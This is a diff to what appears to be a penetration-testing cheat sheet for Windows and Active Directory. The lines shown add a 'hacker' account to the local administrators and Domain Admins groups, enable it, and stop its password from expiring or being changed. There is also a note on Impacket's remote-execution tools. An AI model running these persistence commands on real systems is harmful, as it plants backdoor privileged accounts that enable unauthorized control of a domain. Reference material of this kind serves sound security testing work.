@@ -33,6 +33,13 @@ net localgroup administrators hacker /add
 net localgroup "Remote Desktop Users" hacker /add # RDP access
 net localgroup "Backup Operators" hacker /add # Full access to files
 net group "Domain Admins" hacker /add /domain
+
+# enable a domain user account
+net user hacker /ACTIVE:YES /domain
+# prevent users from changing their password
+net user username  /Passwordchg:No
+# prevent the password to expire
+net user hacker /Expires:Never
 ```
 
 Some info about your user
@@ -195,6 +202,7 @@ PS C:\> wmic /node:target.domain /user:domain\user /password:password process ca
 ## Psexec.py / Smbexec.py / Wmiexec.py 
 
 From [Impacket](https://github.com/SecureAuthCorp/impacket) (:warning: renamed to impacket-xxx in Kali)
+:warning: `get` / `put` for wmiexec, psexec, smbexec, and dcomexec are changing to `lget` and `lput`.
 
 ```powershell
 root@payload$ git clone https://github.com/CoreSecurity/impacket.git
